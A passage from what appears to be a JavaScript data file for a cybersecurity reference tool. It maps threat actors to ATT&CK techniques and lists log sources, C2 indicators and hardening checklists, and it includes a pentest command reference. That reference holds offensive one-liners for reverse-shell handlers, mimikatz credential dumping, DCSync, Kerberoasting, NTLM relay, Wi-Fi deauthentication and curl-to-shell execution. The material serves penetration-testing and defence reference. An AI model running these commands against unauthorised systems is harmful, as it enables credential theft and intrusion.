  { actor: 'APT29', tactic: 'Command and Control', techniques: ['T1071.001 - Web Protocols','T1573 - Encrypted Channel','T1090 - Proxy'] },
  { actor: 'Lazarus', tactic: 'Initial Access', techniques: ['T1566.001 - Spearphishing Attachment','T1566.003 - Spearphishing via Service','T1195.002 - Supply Chain'] },
  { actor: 'Lazarus', tactic: 'Execution', techniques: ['T1059 - Command and Scripting','T1204 - User Execution','T1047 - WMI'] },
  { actor: 'Lazarus', tactic: 'Impact', techniques: ['T1486 - Data Encrypted for Impact','T1485 - Data Destruction','T1561 - Disk Wipe'] },
  { actor: 'Volt Typhoon', tactic: 'Execution', techniques: ['T1059.001 - PowerShell','T1218 - LOLBins (certutil, netsh, wmic)','T1047 - WMI'] },
  { actor: 'Volt Typhoon', tactic: 'Defense Evasion', techniques: ['T1218 - System Binary Proxy Execution','T1036 - Masquerading','T1070 - Indicator Removal'] },
  { actor: 'Volt Typhoon', tactic: 'Discovery', techniques: ['T1046 - Network Service Discovery','T1087 - Account Discovery','T1082 - System Information Discovery'] },
  { actor: 'Sandworm', tactic: 'Initial Access', techniques: ['T1190 - Exploit Public-Facing Application','T1566 - Phishing','T1195.002 - Supply Chain'] },
  { actor: 'Sandworm', tactic: 'Impact', techniques: ['T1485 - Data Destruction','T1489 - Service Stop','T1561 - Disk Wipe','T1486 - Ransomware'] },
  { actor: 'LockBit', tactic: 'Initial Access', techniques: ['T1190 - Exploit Public-Facing Application','T1078 - Valid Accounts','T1133 - External Remote Services'] },
  { actor: 'LockBit', tactic: 'Lateral Movement', techniques: ['T1021.002 - SMB/Admin Shares','T1021.001 - RDP','T1550.002 - Pass the Hash'] },
  { actor: 'LockBit', tactic: 'Impact', techniques: ['T1486 - Data Encrypted for Impact','T1490 - Inhibit System Recovery','T1489 - Service Stop'] },
  { actor: 'LockBit', tactic: 'Exfiltration', techniques: ['T1567 - Exfiltration Over Web Service','T1048 - Exfiltration Over Alternative Protocol'] },
  { actor: 'Scattered Spider', tactic: 'Initial Access', techniques: ['T1566 - Phishing (social engineering)','T1078 - Valid Accounts','T1556 - Modify Authentication Process'] },
  { actor: 'Scattered Spider', tactic: 'Persistence', techniques: ['T1098 - Account Manipulation','T1136 - Create Account','T1078 - Valid Accounts'] },
  { actor: 'Cl0p', tactic: 'Initial Access', techniques: ['T1190 - Exploit Public-Facing Application (MOVEit, GoAnywhere)'] },
  { actor: 'Cl0p', tactic: 'Collection', techniques: ['T1005 - Data from Local System','T1039 - Data from Network Shared Drive'] },
  { actor: 'Cl0p', tactic: 'Exfiltration', techniques: ['T1567 - Exfiltration Over Web Service','T1048 - Alternative Protocol'] },
];

// ============================================================================
// LOG SOURCE PRIORITY FOR DETECTION ENGINEERING
// ============================================================================
const LOG_SOURCES = [
  { source: 'Sysmon', priority: 'Critical', platform: 'Windows', coverage: 'Process creation, network connections, file creation, registry, DLL loads, WMI, DNS, named pipes', setup: 'Install Sysmon with SwiftOnSecurity or Olaf config. Forward to SIEM.', gaps: 'Requires deployment and configuration. Can be evaded by advanced attackers.' },
  { source: 'Windows Security Log', priority: 'Critical', platform: 'Windows', coverage: 'Authentication (4624/4625), privilege use (4672), object access (4663), AD changes (4728/4732)', setup: 'Enable Advanced Audit Policy Configuration. Ensure adequate log size.', gaps: 'Verbose - need filtering. Does not capture command line by default (enable 4688).' },
  { source: 'PowerShell ScriptBlock Logging', priority: 'Critical', platform: 'Windows', coverage: 'Full PowerShell script content including decoded/deobfuscated scripts (EID 4104)', setup: 'GPO: Turn on PowerShell Script Block Logging. Module Logging (4103) also recommended.', gaps: 'Only logs PowerShell. Attacker may use C# or other methods. AMSI bypass can affect logging.' },
  { source: 'Windows Defender / AV Logs', priority: 'High', platform: 'Windows', coverage: 'Malware detection, quarantine events, real-time protection alerts', setup: 'Enable and forward Defender event logs to SIEM. Monitor for disabled protection.', gaps: 'Signature-based - misses novel malware. Attacker may disable.' },
  { source: 'DNS Logs', priority: 'High', platform: 'All', coverage: 'DNS queries and responses - C2 domain detection, DNS tunneling, DGA detection', setup: 'Enable DNS query logging on resolvers. Consider DNS sinkholing.', gaps: 'DoH/DoT may bypass. Volume can be high - need analytics.' },
  { source: 'Proxy / Web Gateway Logs', priority: 'High', platform: 'All', coverage: 'HTTP/S traffic - URLs, user agents, upload/download volumes, categories', setup: 'Deploy transparent or explicit proxy. Enable TLS inspection for visibility.', gaps: 'TLS inspection privacy concerns. Direct connections bypass proxy.' },
  { source: 'Firewall Logs', priority: 'High', platform: 'All', coverage: 'Network connections - allowed/denied flows, port usage, geographic anomalies', setup: 'Log allowed and denied connections. Enable GeoIP enrichment.', gaps: 'High volume. Encrypted traffic content not visible.' },
  { source: 'EDR Telemetry', priority: 'Critical', platform: 'All', coverage: 'Process trees, file operations, registry changes, network connections, injection detection', setup: 'Deploy EDR agent on all endpoints and servers. Tune alert policies.', gaps: 'Agent can be evaded or disabled. Performance impact on endpoints.' },
  { source: 'Cloud Audit Logs', priority: 'Critical', platform: 'Cloud', coverage: 'API calls, resource changes, authentication events, IAM modifications', setup: 'AWS CloudTrail, Azure Activity Log, GCP Cloud Audit Logs - enable and forward to SIEM.', gaps: 'Data plane logging may need separate enablement. Storage costs.' },
  { source: 'Email Gateway Logs', priority: 'High', platform: 'All', coverage: 'Inbound/outbound email, attachment analysis, URL rewriting, phishing detection', setup: 'Forward email security gateway logs. Enable sandbox detonation.', gaps: 'Encrypted attachments. Personal email bypasses corporate gateway.' },
  { source: 'VPN / Remote Access Logs', priority: 'High', platform: 'All', coverage: 'Remote access sessions, authentication, geographic location, session duration', setup: 'Forward VPN concentrator logs. Enable MFA logging.', gaps: 'Legitimate credential use hard to distinguish from stolen credentials.' },
  { source: 'Active Directory Logs', priority: 'Critical', platform: 'Windows', coverage: 'Group membership changes, GPO modifications, trust relationships, replication events', setup: 'Enable AD DS auditing. Forward DC event logs. Monitor for DCSync (4662).', gaps: 'DCShadow can evade standard AD logging. Volume on busy DCs.' },
  { source: 'Network Flow Data', priority: 'Medium', platform: 'All', coverage: 'NetFlow/IPFIX - connection metadata (src/dst/port/bytes), beaconing detection', setup: 'Enable NetFlow on routers/switches. Forward to flow collector/SIEM.', gaps: 'No payload content. Encrypted traffic indistinguishable by protocol.' },
  { source: 'Linux Audit Framework', priority: 'High', platform: 'Linux', coverage: 'Syscall auditing, file access, process execution, network connections', setup: 'Configure auditd rules. Forward /var/log/audit/ to SIEM.', gaps: 'Performance impact with many rules. Requires careful rule tuning.' },
];


// ============================================================================
// PENTEST COMMAND REFERENCE
// ============================================================================
const PENTEST_COMMANDS = {
  reconnaissance: [
    { tool: 'nmap', command: 'nmap -sC -sV -oA scan TARGET', desc: 'Default scripts + version detection scan with output files' },
    { tool: 'nmap', command: 'nmap -sU --top-ports 100 TARGET', desc: 'UDP scan of top 100 ports' },
    { tool: 'nmap', command: 'nmap -p- -T4 --min-rate=1000 TARGET', desc: 'All ports fast scan' },
    { tool: 'nmap', command: 'nmap --script vuln TARGET', desc: 'Run vulnerability detection scripts' },
    { tool: 'masscan', command: 'masscan -p1-65535 --rate=1000 -oG output.gnmap TARGET/24', desc: 'Fast full port scan of entire subnet' },
    { tool: 'rustscan', command: 'rustscan -a TARGET -- -sC -sV', desc: 'Ultra-fast port scan followed by nmap scripts' },
    { tool: 'gobuster', command: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt', desc: 'Directory/file brute force' },
    { tool: 'ffuf', command: 'ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301,302 -o results.json', desc: 'Fast web fuzzer for directories and parameters' },
    { tool: 'nikto', command: 'nikto -h http://TARGET -o nikto_report.html -Format html', desc: 'Web server vulnerability scanner' },
    { tool: 'wpscan', command: 'wpscan --url http://TARGET --enumerate u,vp,vt --api-token TOKEN', desc: 'WordPress vulnerability scanner' },
    { tool: 'subfinder', command: 'subfinder -d TARGET -all -o subdomains.txt', desc: 'Passive subdomain enumeration from multiple sources' },
    { tool: 'amass', command: 'amass enum -d TARGET -active -brute -o amass_results.txt', desc: 'Active and passive subdomain enumeration' },
    { tool: 'theHarvester', command: 'theHarvester -d TARGET -l 500 -b all', desc: 'Harvest emails, names, subdomains from public sources' },
    { tool: 'dnsrecon', command: 'dnsrecon -d TARGET -t std,brt,axfr', desc: 'DNS enumeration - standard, brute, and zone transfer' },
    { tool: 'enum4linux', command: 'enum4linux -a TARGET', desc: 'SMB/NetBIOS enumeration (users, shares, policies)' },
  ],
  exploitation: [
    { tool: 'metasploit', command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4444; exploit"', desc: 'Metasploit reverse shell listener' },
    { tool: 'searchsploit', command: 'searchsploit SERVICE VERSION', desc: 'Search local Exploit-DB for known exploits' },
    { tool: 'sqlmap', command: 'sqlmap -u "http://TARGET/page?id=1" --dbs --batch', desc: 'Automated SQL injection exploitation' },
    { tool: 'hydra', command: 'hydra -L users.txt -P passwords.txt TARGET ssh -t 4', desc: 'Brute force SSH login credentials' },
    { tool: 'crackmapexec', command: 'crackmapexec smb TARGET -u user -p password --shares', desc: 'SMB enumeration with credentials' },
    { tool: 'impacket-psexec', command: 'impacket-psexec DOMAIN/user:password@TARGET', desc: 'Remote code execution via PsExec-style' },
    { tool: 'impacket-wmiexec', command: 'impacket-wmiexec DOMAIN/user:password@TARGET', desc: 'Stealthier remote execution via WMI' },
    { tool: 'evil-winrm', command: 'evil-winrm -i TARGET -u user -p password', desc: 'Windows Remote Management shell' },
    { tool: 'chisel', command: 'chisel server -p 8080 --reverse', desc: 'TCP tunneling over HTTP for pivoting' },
    { tool: 'ligolo-ng', command: 'ligolo-ng -selfcert', desc: 'Advanced tunneling and pivoting tool' },
  ],
  post_exploitation: [
    { tool: 'mimikatz', command: 'privilege::debug\nsekurlsa::logonpasswords', desc: 'Dump plaintext passwords and hashes from LSASS' },
    { tool: 'mimikatz', command: 'lsadump::dcsync /domain:DOMAIN /user:krbtgt', desc: 'DCSync attack - extract krbtgt hash for Golden Ticket' },
    { tool: 'SharpHound', command: 'SharpHound.exe -c All --outputdirectory C:\\temp', desc: 'BloodHound data collection for AD attack path analysis' },
    { tool: 'Rubeus', command: 'Rubeus.exe kerberoast /outfile:hashes.txt', desc: 'Kerberoast all SPNs in the domain' },
    { tool: 'Rubeus', command: 'Rubeus.exe asreproast /outfile:asrep.txt', desc: 'AS-REP roast accounts without pre-auth' },
    { tool: 'Certify', command: 'Certify.exe find /vulnerable', desc: 'Find vulnerable ADCS certificate templates (ESC1-ESC8)' },
    { tool: 'linpeas', command: 'curl -L https://github.com/.../linpeas.sh | sh', desc: 'Linux privilege escalation automated scanner' },
    { tool: 'winpeas', command: 'winPEASx64.exe', desc: 'Windows privilege escalation automated scanner' },
    { tool: 'Seatbelt', command: 'Seatbelt.exe -group=all', desc: 'Windows security checks and enumeration' },
    { tool: 'PowerView', command: 'Get-DomainUser -SPN | Select samaccountname,serviceprincipalname', desc: 'Find Kerberoastable accounts in AD' },
    { tool: 'secretsdump', command: 'impacket-secretsdump DOMAIN/user:password@DC-IP', desc: 'Remote credential dumping from DC (SAM, LSA, NTDS)' },
    { tool: 'crackmapexec', command: 'crackmapexec smb TARGET -u user -H NTLM_HASH --lsa', desc: 'Pass-the-hash with LSA secret extraction' },
  ],
  wireless: [
    { tool: 'airmon-ng', command: 'airmon-ng start wlan0', desc: 'Put wireless adapter into monitor mode' },
    { tool: 'airodump-ng', command: 'airodump-ng wlan0mon', desc: 'Capture wireless traffic and list access points' },
    { tool: 'aireplay-ng', command: 'aireplay-ng -0 5 -a BSSID wlan0mon', desc: 'Deauthentication attack to capture WPA handshake' },
    { tool: 'aircrack-ng', command: 'aircrack-ng -w wordlist.txt capture.cap', desc: 'Crack WPA/WPA2 handshake with wordlist' },
    { tool: 'hashcat', command: 'hashcat -m 22000 capture.hc22000 wordlist.txt', desc: 'GPU-accelerated WPA/WPA2 cracking' },
    { tool: 'hcxdumptool', command: 'hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1', desc: 'Capture PMKID and handshakes' },
    { tool: 'wifite', command: 'wifite --kill', desc: 'Automated wireless attack framework' },
    { tool: 'bettercap', command: 'bettercap -iface wlan0', desc: 'Network attack and monitoring framework' },
  ],
  password_cracking: [
    { tool: 'hashcat', command: 'hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r rules/best64.rule', desc: 'NTLM hash cracking with rules' },
    { tool: 'hashcat', command: 'hashcat -m 13100 kerberoast.txt wordlist.txt', desc: 'Crack Kerberoasting TGS hashes' },
    { tool: 'hashcat', command: 'hashcat -m 18200 asrep.txt wordlist.txt', desc: 'Crack AS-REP roasting hashes' },
    { tool: 'hashcat', command: 'hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?d?d?d?d', desc: 'NTLM brute force with mask (Ulll1234 pattern)' },
    { tool: 'john', command: 'john --wordlist=rockyou.txt --format=NT hashes.txt', desc: 'John the Ripper NTLM cracking' },
    { tool: 'john', command: 'john --rules --wordlist=rockyou.txt shadow.txt', desc: 'Crack Linux shadow file with rules' },
    { tool: 'john', command: 'keepass2john database.kdbx > keepass_hash.txt && john keepass_hash.txt', desc: 'Extract and crack KeePass database password' },
    { tool: 'responder', command: 'responder -I eth0 -wrfv', desc: 'LLMNR/NBT-NS/MDNS poisoner to capture NTLMv2 hashes' },
    { tool: 'ntlmrelayx', command: 'impacket-ntlmrelayx -tf targets.txt -smb2support', desc: 'NTLM relay attack to target SMB servers' },
    { tool: 'hashcat', command: 'hashcat -m 5600 ntlmv2.txt wordlist.txt', desc: 'Crack captured NTLMv2 hashes' },
  ],
};

// ============================================================================
// COMMON WORDLISTS REFERENCE
// ============================================================================
const WORDLISTS = [
  { name: 'rockyou.txt', entries: '14.3M', size: '134 MB', location: '/usr/share/wordlists/rockyou.txt', usage: 'General password cracking - most common passwords', source: 'RockYou breach (2009)' },
  { name: 'SecLists/Passwords', entries: '50M+', size: 'Variable', location: '/usr/share/seclists/Passwords/', usage: 'Categorized password lists (common, leaked, by language)', source: 'Daniel Miessler / SecLists' },
  { name: 'SecLists/Discovery', entries: '10M+', size: 'Variable', location: '/usr/share/seclists/Discovery/Web-Content/', usage: 'Web directory and file brute forcing', source: 'Daniel Miessler / SecLists' },
  { name: 'SecLists/Usernames', entries: '100K+', size: 'Variable', location: '/usr/share/seclists/Usernames/', usage: 'Username enumeration and brute forcing', source: 'Daniel Miessler / SecLists' },
  { name: 'dirb/common.txt', entries: '4.6K', size: '36 KB', location: '/usr/share/wordlists/dirb/common.txt', usage: 'Quick web directory scan', source: 'DIRB project' },
  { name: 'dirbuster/medium.txt', entries: '220K', size: '1.9 MB', location: '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt', usage: 'Comprehensive web directory brute force', source: 'OWASP DirBuster' },
  { name: 'subdomains-top1million', entries: '1M', size: '12 MB', location: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt', usage: 'Subdomain brute forcing', source: 'SecLists' },
  { name: 'hashcat rules', entries: 'N/A', size: 'Variable', location: '/usr/share/hashcat/rules/', usage: 'Password mutation rules for hashcat', source: 'Hashcat project' },
  { name: 'CeWL (custom)', entries: 'Generated', size: 'Variable', location: 'cewl http://TARGET -m 6 -w custom_wordlist.txt', usage: 'Custom wordlist generated from target website', source: 'CeWL tool' },
  { name: 'Probable Wordlists', entries: '17B+', size: '100+ GB', location: 'https://github.com/berzerk0/Probable-Wordlists', usage: 'Comprehensive password lists sorted by probability', source: 'berzerk0' },
  { name: 'kaonashi', entries: '100M+', size: '2.4 GB', location: 'https://github.com/kaonashi-passwords/Kaonashi', usage: 'Real-world password patterns from breaches', source: 'Kaonashi project' },
  { name: 'OneRuleToRuleThemAll', entries: 'N/A (rules)', size: '49 KB', location: 'https://github.com/NotSoSecure/password_cracking_rules', usage: 'Single hashcat rule file combining best rules', source: 'NotSoSecure' },
];

// ============================================================================
// COMMON C2 FRAMEWORK INDICATORS
// ============================================================================
const C2_INDICATORS = [
  { framework: 'Cobalt Strike', defaultPort: '443/80', userAgent: 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)', ja3: '72a589da586844d7f0818ce684948eea', namedPipe: '\\\\.\\pipe\\msagent_*', beaconInterval: '60s default', malleable: true, notes: 'Malleable C2 profiles can change all network indicators. Check JA3, certificate, and beacon interval.' },
  { framework: 'Metasploit', defaultPort: '4444/4443', userAgent: 'Mozilla/5.0', ja3: 'varies', namedPipe: 'N/A', beaconInterval: 'N/A (interactive)', malleable: false, notes: 'Default reverse handler on 4444. Meterpreter uses custom protocol. HTTP stager available.' },
  { framework: 'Sliver', defaultPort: '443/8888', userAgent: 'Custom', ja3: 'varies (mTLS)', namedPipe: 'N/A', beaconInterval: 'Configurable', malleable: false, notes: 'Supports mTLS, WireGuard, HTTP/S, DNS. Go-based implants. Growing in popularity as CS alternative.' },
  { framework: 'Brute Ratel', defaultPort: '443', userAgent: 'Custom per profile', ja3: 'Custom', namedPipe: 'Custom', beaconInterval: 'Configurable', malleable: true, notes: 'Designed for EDR evasion. Direct syscalls, NTDLL unhooking. Cracked versions circulating since 2022.' },
  { framework: 'Havoc', defaultPort: '443/40056', userAgent: 'Custom', ja3: 'varies', namedPipe: 'N/A', beaconInterval: 'Configurable', malleable: false, notes: 'Open source C2 framework. Modern UI. Supports multiple listener types. Growing adoption.' },
  { framework: 'Mythic', defaultPort: 'Configurable', userAgent: 'Per agent', ja3: 'varies', namedPipe: 'N/A', beaconInterval: 'Per agent', malleable: false, notes: 'Multi-agent C2 platform. Supports many agent types (Apollo, Poseidon, etc.). Collaborative operation.' },
  { framework: 'PowerShell Empire', defaultPort: '443/80', userAgent: 'Mozilla/5.0', ja3: 'varies', namedPipe: 'N/A', beaconInterval: '5s default', malleable: false, notes: 'PowerShell and Python based. Common URI patterns: /login/process.php, /admin/get.php. Declining usage.' },
  { framework: 'Covenant', defaultPort: '443/80', userAgent: 'Custom per listener', ja3: 'varies', namedPipe: 'N/A', beaconInterval: 'Configurable', malleable: false, notes: '.NET based C2. Web UI. Supports HTTP, HTTPS, bridge listeners. Used by some nation-state actors.' },
  { framework: 'PoshC2', defaultPort: '443', userAgent: 'Custom', ja3: 'varies', namedPipe: 'N/A', beaconInterval: 'Configurable', malleable: false, notes: 'PowerShell/C#/Python C2 framework. Proxy-aware. Supports domain fronting.' },
  { framework: 'Merlin', defaultPort: '443', userAgent: 'Go-http-client/1.1', ja3: 'varies', namedPipe: 'N/A', beaconInterval: 'Configurable', malleable: false, notes: 'Go-based C2 with HTTP/2 and HTTP/3 (QUIC) support. Cross-platform agents.' },
];


// ============================================================================
// SECURITY HARDENING CHECKLIST DATABASE
// ============================================================================
const HARDENING_CHECKLISTS = {
  windows_server: [
    { category: 'Authentication', item: 'Disable NTLM where possible, enforce NTLMv2 minimum', priority: 'Critical', cis: '2.3.8.1' },
    { category: 'Authentication', item: 'Enable credential guard on DCs and sensitive servers', priority: 'Critical', cis: 'N/A' },
    { category: 'Authentication', item: 'Enforce minimum 14-character passwords with complexity', priority: 'High', cis: '1.1.4' },
    { category: 'Authentication', item: 'Set account lockout threshold to 5 invalid attempts', priority: 'High', cis: '1.2.1' },
    { category: 'Authentication', item: 'Disable LM hash storage (NoLMHash)', priority: 'Critical', cis: '2.3.7.7' },
    { category: 'Network', item: 'Disable SMBv1 protocol entirely', priority: 'Critical', cis: '18.3.3' },
    { category: 'Network', item: 'Enable SMB signing on all connections', priority: 'High', cis: '2.3.9.2' },
    { category: 'Network', item: 'Restrict anonymous enumeration of SAM accounts', priority: 'High', cis: '2.3.11.7' },
    { category: 'Network', item: 'Disable LLMNR and NetBIOS over TCP/IP', priority: 'High', cis: '18.4.1' },
    { category: 'Logging', item: 'Enable command line in process creation events (4688)', priority: 'Critical', cis: '18.9.3.1' },
    { category: 'Logging', item: 'Deploy Sysmon with comprehensive configuration', priority: 'Critical', cis: 'N/A' },
    { category: 'Logging', item: 'Enable PowerShell Script Block Logging', priority: 'Critical', cis: '18.9.100.1' },
    { category: 'Logging', item: 'Configure audit policy for logon/logoff events', priority: 'High', cis: '17.5.1-6' },
    { category: 'Logging', item: 'Forward all security logs to centralized SIEM', priority: 'Critical', cis: 'N/A' },
    { category: 'Services', item: 'Disable unnecessary services (Spooler on DCs, RemoteRegistry)', priority: 'High', cis: '5.x' },
    { category: 'Services', item: 'Remove or disable IIS, FTP, Telnet if not needed', priority: 'High', cis: 'N/A' },
    { category: 'Patching', item: 'Apply security patches within 72 hours (critical) / 30 days (high)', priority: 'Critical', cis: 'N/A' },
    { category: 'Access Control', item: 'Implement tier model for admin accounts (Tier 0/1/2)', priority: 'Critical', cis: 'N/A' },
    { category: 'Access Control', item: 'Use Privileged Access Workstations (PAWs) for admin tasks', priority: 'High', cis: 'N/A' },
    { category: 'Access Control', item: 'Enable Protected Users group for sensitive accounts', priority: 'High', cis: 'N/A' },
    { category: 'Firewall', item: 'Enable Windows Firewall on all profiles (Domain/Private/Public)', priority: 'High', cis: '9.1.1' },
    { category: 'Firewall', item: 'Block inbound connections to management ports from non-admin subnets', priority: 'High', cis: 'N/A' },
  ],
  linux_server: [
    { category: 'Authentication', item: 'Disable root SSH login (PermitRootLogin no)', priority: 'Critical', cis: '5.2.10' },
    { category: 'Authentication', item: 'Use SSH key-based authentication only', priority: 'High', cis: '5.2.6' },
    { category: 'Authentication', item: 'Set password minimum length to 14 characters', priority: 'High', cis: '5.4.1' },
    { category: 'Authentication', item: 'Configure PAM to use strong hashing (SHA-512, rounds=65536)', priority: 'High', cis: '5.4.4' },
    { category: 'Authentication', item: 'Set account lockout after 5 failed attempts (pam_tally2/faillock)', priority: 'High', cis: '5.4.2' },
    { category: 'Permissions', item: 'Ensure no world-writable files exist', priority: 'Medium', cis: '6.1.10' },
    { category: 'Permissions', item: 'Audit and remove unnecessary SUID/SGID binaries', priority: 'High', cis: '6.1.13' },
    { category: 'Permissions', item: 'Set sticky bit on all world-writable directories', priority: 'Medium', cis: '6.1.11' },
    { category: 'Permissions', item: 'Restrict /etc/shadow to root:shadow 640', priority: 'Critical', cis: '6.1.4' },
    { category: 'Permissions', item: 'Restrict cron access (cron.allow, at.allow)', priority: 'Medium', cis: '5.1.8' },
    { category: 'Network', item: 'Disable IPv6 if not required', priority: 'Low', cis: '3.1.1' },
    { category: 'Network', item: 'Enable syn cookies (net.ipv4.tcp_syncookies = 1)', priority: 'High', cis: '3.2.8' },
    { category: 'Network', item: 'Disable IP forwarding unless router', priority: 'High', cis: '3.1.2' },
    { category: 'Network', item: 'Configure iptables/nftables with default deny', priority: 'Critical', cis: '3.4.x' },
    { category: 'Logging', item: 'Enable auditd with NIST 800-53 ruleset', priority: 'Critical', cis: '4.1.x' },
    { category: 'Logging', item: 'Forward logs to centralized SIEM via rsyslog/syslog-ng', priority: 'Critical', cis: '4.2.x' },
    { category: 'Logging', item: 'Ensure log files are not world-readable', priority: 'High', cis: '4.2.3' },
    { category: 'Services', item: 'Disable unnecessary services (avahi, cups, nfs, rpcbind)', priority: 'High', cis: '2.1.x' },
    { category: 'Services', item: 'Remove unnecessary packages (telnet, rsh, talk, tftp)', priority: 'High', cis: '2.3.x' },
    { category: 'Kernel', item: 'Enable ASLR (kernel.randomize_va_space = 2)', priority: 'High', cis: '1.5.2' },
    { category: 'Kernel', item: 'Restrict kernel module loading if not needed', priority: 'Medium', cis: '1.1.x' },
    { category: 'Updates', item: 'Enable automatic security updates (unattended-upgrades)', priority: 'High', cis: '1.9' },
  ],
  active_directory: [
    { category: 'Accounts', item: 'Rename or disable default Administrator account', priority: 'High', cis: 'N/A' },
    { category: 'Accounts', item: 'Create separate admin accounts (T0, T1, T2 tiering)', priority: 'Critical', cis: 'N/A' },
    { category: 'Accounts', item: 'Add sensitive accounts to Protected Users group', priority: 'High', cis: 'N/A' },
    { category: 'Accounts', item: 'Enforce MFA for all privileged accounts', priority: 'Critical', cis: 'N/A' },
    { category: 'Accounts', item: 'Set krbtgt password rotation (every 180 days minimum)', priority: 'Critical', cis: 'N/A' },
    { category: 'Kerberos', item: 'Enforce AES encryption for Kerberos (disable RC4)', priority: 'Critical', cis: 'N/A' },
    { category: 'Kerberos', item: 'Enable Kerberos pre-authentication for all accounts', priority: 'Critical', cis: 'N/A' },
    { category: 'Kerberos', item: 'Use Group Managed Service Accounts (gMSA) for services', priority: 'High', cis: 'N/A' },
    { category: 'Delegation', item: 'Review and restrict constrained/unconstrained delegation', priority: 'Critical', cis: 'N/A' },
    { category: 'Delegation', item: 'Mark sensitive accounts as "Not Delegated"', priority: 'High', cis: 'N/A' },
    { category: 'GPO', item: 'Restrict GPO edit permissions to Tier 0 admins only', priority: 'Critical', cis: 'N/A' },
    { category: 'GPO', item: 'Enable LAPS (Local Administrator Password Solution)', priority: 'Critical', cis: 'N/A' },
    { category: 'Monitoring', item: 'Enable AD DS auditing for object changes (5136)', priority: 'Critical', cis: 'N/A' },
    { category: 'Monitoring', item: 'Monitor for DCSync attacks (4662 with replication)', priority: 'Critical', cis: 'N/A' },
    { category: 'Monitoring', item: 'Deploy Microsoft ATA or Azure ATP / Defender for Identity', priority: 'High', cis: 'N/A' },
    { category: 'Trusts', item: 'Review and minimize domain/forest trusts', priority: 'High', cis: 'N/A' },
    { category: 'Trusts', item: 'Enable SID filtering on all external trusts', priority: 'Critical', cis: 'N/A' },
    { category: 'Certificates', item: 'Audit AD Certificate Services for vulnerable templates (ESC1-ESC8)', priority: 'Critical', cis: 'N/A' },
    { category: 'Certificates', item: 'Remove enrollment permissions from Domain Users on sensitive templates', priority: 'Critical', cis: 'N/A' },
    { category: 'Backup', item: 'Maintain offline backup of AD (System State)', priority: 'Critical', cis: 'N/A' },
    { category: 'AdminSDHolder', item: 'Monitor AdminSDHolder object for unauthorized modifications', priority: 'Critical', cis: 'N/A' },
    { category: 'DNS', item: 'Restrict DNS zone transfers to authorized servers only', priority: 'High', cis: 'N/A' },
  ],
  cloud_aws: [
    { category: 'IAM', item: 'Enable MFA for all IAM users, especially root', priority: 'Critical', cis: '1.5' },
    { category: 'IAM', item: 'Never use root account for daily operations', priority: 'Critical', cis: '1.1' },
    { category: 'IAM', item: 'Rotate access keys every 90 days', priority: 'High', cis: '1.14' },
    { category: 'IAM', item: 'Implement least privilege for all IAM policies', priority: 'Critical', cis: '1.16' },
    { category: 'IAM', item: 'Enable IAM Access Analyzer', priority: 'High', cis: 'N/A' },
    { category: 'Logging', item: 'Enable CloudTrail in all regions with log file validation', priority: 'Critical', cis: '3.1' },
    { category: 'Logging', item: 'Enable VPC Flow Logs for all VPCs', priority: 'High', cis: '3.9' },
    { category: 'Logging', item: 'Enable GuardDuty in all regions', priority: 'Critical', cis: 'N/A' },
    { category: 'Logging', item: 'Configure CloudWatch alarms for unauthorized API calls', priority: 'High', cis: '4.1' },
    { category: 'Storage', item: 'Enable S3 Block Public Access at account level', priority: 'Critical', cis: '2.1.5' },
    { category: 'Storage', item: 'Enable default encryption for all S3 buckets', priority: 'High', cis: '2.1.1' },
    { category: 'Storage', item: 'Enable S3 bucket versioning', priority: 'Medium', cis: '2.1.3' },
    { category: 'Network', item: 'Restrict security group inbound rules (no 0.0.0.0/0 on SSH/RDP)', priority: 'Critical', cis: '5.2' },
    { category: 'Network', item: 'Use VPC endpoints for AWS service access', priority: 'Medium', cis: 'N/A' },
    { category: 'Compute', item: 'Enforce IMDSv2 on all EC2 instances', priority: 'Critical', cis: 'N/A' },
    { category: 'Compute', item: 'Enable EBS encryption by default', priority: 'High', cis: '2.2.1' },
    { category: 'Database', item: 'Ensure RDS instances are not publicly accessible', priority: 'Critical', cis: '2.3.1' },
    { category: 'Database', item: 'Enable RDS encryption at rest', priority: 'High', cis: '2.3.1' },
    { category: 'Security', item: 'Enable AWS Security Hub', priority: 'High', cis: 'N/A' },
    { category: 'Security', item: 'Enable AWS Config for resource compliance monitoring', priority: 'High', cis: 'N/A' },
  ],
};


// ============================================================================
// THREAT INTELLIGENCE PLATFORMS REFERENCE
// ============================================================================
const TI_PLATFORMS = [
  { name: 'MISP', type: 'Open Source TIP', desc: 'Threat Intelligence Sharing Platform with STIX/TAXII support', features: ['IOC sharing','Event correlation','Galaxy clusters','MITRE ATT&CK integration','Taxonomies','API access','Community feeds'], deployment: 'Self-hosted', cost: 'Free' },
  { name: 'OpenCTI', type: 'Open Source TIP', desc: 'Cyber Threat Intelligence platform with graph database backend', features: ['Knowledge graph','STIX 2.1 native','Connectors for 50+ sources','Observable enrichment','Reports and analysis','Dashboard and widgets'], deployment: 'Self-hosted (Docker)', cost: 'Free (Enterprise available)' },
  { name: 'TheHive', type: 'Open Source SIRP', desc: 'Security Incident Response Platform with case management', features: ['Case management','Observable analysis','Cortex integration','Playbook automation','Collaboration','API-first design'], deployment: 'Self-hosted', cost: 'Free (TheHive 5 requires license)' },
  { name: 'Cortex', type: 'Open Source Analysis', desc: 'Observable analysis and active response engine for TheHive', features: ['100+ analyzers','Active responders','Bulk analysis','Report generation','API integration','Multi-tenant'], deployment: 'Self-hosted', cost: 'Free' },
  { name: 'YETI', type: 'Open Source TIP', desc: 'Your Everyday Threat Intelligence - organizing observables and TTPs', features: ['Observable management','Indicator feeds','Analytics plugins','Investigation tools','Entity relationships'], deployment: 'Self-hosted', cost: 'Free' },
  { name: 'CrowdStrike Falcon Intelligence', type: 'Commercial TI', desc: 'Premium threat intelligence with actor tracking and malware analysis', features: ['Actor profiles','Indicator feeds','Malware analysis','Vulnerability intel','Custom reports','API access'], deployment: 'Cloud (SaaS)', cost: 'Commercial ($$$$)' },
